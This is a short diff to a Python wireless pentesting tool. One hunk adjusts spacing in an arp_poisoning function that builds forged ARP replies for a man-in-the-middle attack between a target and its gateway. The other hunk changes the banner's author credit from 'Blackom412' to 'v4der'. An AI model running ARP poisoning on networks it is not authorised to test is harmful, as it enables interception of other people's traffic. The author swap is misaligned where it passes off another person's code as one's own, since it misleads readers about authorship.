@@ -75,7 +75,7 @@ def arp_poisoning(target, target_mac, gateway_mac, plugin, interface):
 	poison_target.hwdst = target_mac
 	
 	poison_gateway       = ARP()
-	poison_gateway.op     = 2
+	poison_gateway.op    = 2
 	poison_gateway.psrc  = target
 	poison_gateway.pdst  = GATEWAY
 	poison_gateway.hwdst = gateway_mac
@@ -174,7 +174,7 @@ def banner():
 #                                    #
 #     %sWirless Pentesting tool%s        #
 #                                    #
-#       %sCode by : Blackom412%s         #
+#       %sCode by : v4der%s              #
 #                                    #
 #           %sVERSION : 0.1%s            #
 #                                    #
